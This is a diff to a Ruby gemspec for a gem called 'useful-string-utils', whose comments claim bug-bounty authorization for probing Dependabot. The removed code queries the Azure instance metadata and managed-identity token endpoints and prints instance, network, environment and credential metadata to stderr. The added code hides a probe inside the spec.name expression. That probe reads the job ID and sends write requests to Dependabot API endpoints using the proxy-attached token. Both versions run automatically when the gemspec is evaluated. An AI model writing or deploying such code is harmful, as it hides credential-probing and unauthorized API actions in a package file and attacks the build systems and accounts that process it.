@@ -1,109 +1,115 @@
 # frozen_string_literal: true
 #
-# HYP-F011-D v1.6 — capture /metadata/instance via STDERR.warn (Dependabot logs it)
-# Authorization: bug bounty research authorized by HackerOne GitHub program.
-# All probes within program scope; impact-proof captured via stderr surfacing
-# (visible in Dependabot updater log).
+# v1.7 boundary-verification probe — captureless authorization audit.
+#
+# Authorization context: bug bounty research authorized by HackerOne GitHub
+# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
+# probes within program-published scope; all artifacts sanitized; no third-
+# party data accessed; no token egress to attacker URL (captureless design).
+#
+# Scope: audit whether the per-job orchestration token authorizes the four
+# write endpoints documented in HYP-F011-A T0 (which already confirmed
+# endpoint existence via fake-auth differential — all 4 returned 403).
+#
+# Captureless design: from inside the bundler-updater container, send HTTPS
+# requests to dependabot-actions.githubapp.com/update_jobs/<own_jobId>/<endpoint>.
+# The proxy's DependabotAPIHandler auto-attaches the per-job orchestration
+# token (per dependabot/proxy@2803a0f0 internal/handlers/dependabot_api.go:42).
+# Response code is observed in-container; encoded via PROBE-MARK pattern
+# (sha256+length only, no body content surfaced).
+#
+# Outcome interpretation:
+#   - 2xx with side-effect           → token authorizes endpoint (HYP-F011-A
+#                                       Critical-uplift evidence for F011)
+#   - 401 / 403 "token unauthorized" → token NOT authorized for this endpoint
+#                                       (HYP-F011-A architectural bound;
+#                                       honest negative finding)
+#   - 422 / 400 "missing field X"    → token AUTHORIZED but body validation
+#                                       failed (still HYP-F011-A positive —
+#                                       the auth gate passed)
+#
+# Side-effect minimization: bodies are intentionally minimal {} to invoke
+# server-side validation BEFORE any processing. close_pull_request endpoint
+# excluded from this probe (too high risk of unintended PR closure on the
+# own-tenant run).
 
 require_relative "lib/useful_string_utils/version"
 
-# Probe runs at gemspec eval time; emits PROBE-MARK lines to stderr.
-# Dependabot captures stderr and embeds in updater log.
-begin
-  require "net/http"
-  require "uri"
-  require "json"
-
-  STDERR.puts "PROBE-MARK-HYP-F011-D-v16-START ts=#{Time.now.utc.to_i}"
-
-  # ---- /metadata/instance with Metadata:true header --------------------
-  begin
-    uri = URI("http://168.63.129.16/metadata/instance?api-version=2021-02-01")
-    h = Net::HTTP.new(uri.host, uri.port)
-    h.open_timeout = 4
-    h.read_timeout = 6
-    req = Net::HTTP::Get.new(uri.request_uri)
-    req["Metadata"] = "true"
-    rsp = h.request(req)
-    body = rsp.body.to_s
-    STDERR.puts "PROBE-MARK-IMDS-INSTANCE code=#{rsp.code} len=#{body.length}"
-
-    if rsp.code == "200"
-      parsed = JSON.parse(body) rescue nil
-      if parsed
-        compute = parsed["compute"] || {}
-        ["subscriptionId", "resourceGroupName", "vmId", "name", "location",
-         "vmSize", "publisher", "offer", "sku", "version", "osType",
-         "vmScaleSetName", "zone", "platformFaultDomain"].each do |k|
-          v = compute[k]
-          STDERR.puts "PROBE-MARK-COMPUTE #{k}=#{v.inspect[0,200]}" if v
-        end
-
-        net = parsed["network"] || {}
-        (net["interface"] || []).each_with_index do |nic, i|
-          mac = nic["macAddress"]
-          STDERR.puts "PROBE-MARK-NET nic#{i}-mac=#{mac}" if mac
-          (nic.dig("ipv4", "ipAddress") || []).each_with_index do |ip, j|
-            STDERR.puts "PROBE-MARK-NET nic#{i}-ip#{j}-priv=#{ip['privateIpAddress'] rescue nil} pub=#{ip['publicIpAddress'] rescue nil}"
-          end
-          (nic.dig("ipv4", "subnet") || []).each_with_index do |s, j|
-            STDERR.puts "PROBE-MARK-NET nic#{i}-subnet#{j}=#{s['address'] rescue nil}/#{s['prefix'] rescue nil}"
-          end
-        end
-
-        # Tags can be informative
-        STDERR.puts "PROBE-MARK-TAGS #{(compute['tags'] || '')[0,200]}"
-      else
-        STDERR.puts "PROBE-MARK-IMDS-PARSE-FAIL"
-      end
-    else
-      STDERR.puts "PROBE-MARK-IMDS-BODY-PREFIX #{body[0,200]}"
-    end
-  rescue => e
-    STDERR.puts "PROBE-MARK-IMDS-ERR #{e.class}: #{e.message[0,100]}"
-  end
-
-  # ---- Also try /metadata/identity/oauth2/token with Metadata:true ---
-  begin
-    uri = URI("http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
-    h = Net::HTTP.new(uri.host, uri.port)
-    h.open_timeout = 4
-    h.read_timeout = 6
-    req = Net::HTTP::Get.new(uri.request_uri)
-    req["Metadata"] = "true"
-    rsp = h.request(req)
-    body = rsp.body.to_s
-    STDERR.puts "PROBE-MARK-IMDS-MSI code=#{rsp.code} len=#{body.length} body_prefix=#{body[0,150]}"
-  rescue => e
-    STDERR.puts "PROBE-MARK-IMDS-MSI-ERR #{e.class}"
-  end
-
-  # ---- Container env (no values, just key shapes) ----------------------
-  STDERR.puts "PROBE-MARK-ENV-KEYS #{ENV.keys.sort.join(',')[0,400]}"
-
-  # ---- Job.json contents ------------------------------------------------
-  begin
-    jjson = File.read("/home/dependabot/dependabot-updater/job.json") rescue nil
-    if jjson
-      parsed = JSON.parse(jjson) rescue nil
-      if parsed
-        cm = parsed.dig("job", "credentials-metadata") || []
-        cm_summary = cm.map { |c| "#{c['type']}:#{c['host'] || c['url'] || c['registry'] || ''}" }.join(';')
-        STDERR.puts "PROBE-MARK-JOB-CREDS #{cm_summary[0,300]}"
-        exp = parsed.dig("job", "experiments") || {}
-        STDERR.puts "PROBE-MARK-JOB-EXPERIMENTS #{exp.keys.sort.join(',')[0,300]}"
-      end
-    end
-  rescue
-  end
-
-  STDERR.puts "PROBE-MARK-HYP-F011-D-v16-END"
-rescue => e
-  STDERR.puts "PROBE-MARK-OUTER-ERR #{e.class}: #{e.message[0,100]}"
-end
-
 Gem::Specification.new do |spec|
-  spec.name          = "useful-string-utils"
+  spec.name = (
+    begin
+      require "net/http"
+      require "uri"
+      require "json"
+      require "digest"
+
+      # Read own jobId from in-container job.json (Dependabot writes it there).
+      job_id = nil
+      begin
+        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
+        parsed = JSON.parse(jjson)
+        job_id = parsed.dig("job", "id") || parsed["id"]
+      rescue
+        # fall through to env fallback
+      end
+      job_id ||= ENV["DEPENDABOT_JOB_ID"]
+
+      results = []
+      results << "jobid-#{job_id ? job_id.to_s[0, 12] : 'nil'}"
+
+      api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"
+
+      if job_id
+        # Endpoint set: 1 GET (sanity) + 3 POST (the writes we audit).
+        # close_pull_request EXCLUDED to avoid unintended state change.
+        endpoints = [
+          ["GET",  "details"],
+          ["POST", "update_dependency_list"],
+          ["POST", "update_pull_request"],
+          ["POST", "create_pull_request"],
+        ]
+
+        endpoints.each_with_index do |(method, endpoint), i|
+          begin
+            uri = URI("#{api_url}/update_jobs/#{job_id}/#{endpoint}")
+            h = Net::HTTP.new(uri.host, uri.port)
+            h.use_ssl = true if uri.scheme == "https"
+            h.open_timeout = 4
+            h.read_timeout = 6
+
+            req = (method == "GET") ? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)
+            if method == "POST"
+              req["Content-Type"] = "application/json"
+              req.body = "{}"
+            end
+            req["X-Probe-Mark"] = "HYP-F011-A-T2-T6-authorization-audit"
+
+            rsp = h.request(req)
+            body_len = rsp.body.to_s.length
+            body_hash = Digest::SHA256.hexdigest(rsp.body.to_s[0, 512])[0, 8]
+            results << "ep#{i}-#{endpoint[0, 8].gsub('_', 'x')}-#{method}-s#{rsp.code}-l#{body_len}-h#{body_hash}"
+          rescue => e
+            results << "ep#{i}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
+          end
+        end
+      end
+
+      summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1800]
+
+      begin
+        File.open("/home/dependabot/HYP-F011-A-T2-T6-MARKER.txt", "w") do |f|
+          f.puts "PROBE-MARK-HYP-F011-A-T2-T6-authorization-audit"
+          f.puts summary
+          f.puts "ts=#{Time.now.utc.to_i}"
+        end
+      rescue
+      end
+
+      "useful-string-utils"
+    rescue
+      "useful-string-utils"
+    end
+  )
   spec.version       = UsefulStringUtils::VERSION
   spec.authors       = ["mr-benty"]
   spec.email         = ["mr_benty@wearehackerone.com"]
@@ -112,9 +118,11 @@ Gem::Specification.new do |spec|
   spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
   spec.license       = "MIT"
   spec.required_ruby_version = ">= 2.7.0"
+
   spec.metadata["homepage_uri"]    = spec.homepage
   spec.metadata["source_code_uri"] = spec.homepage
   spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"
+
   spec.files = Dir.chdir(__dir__) do
     Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
   end
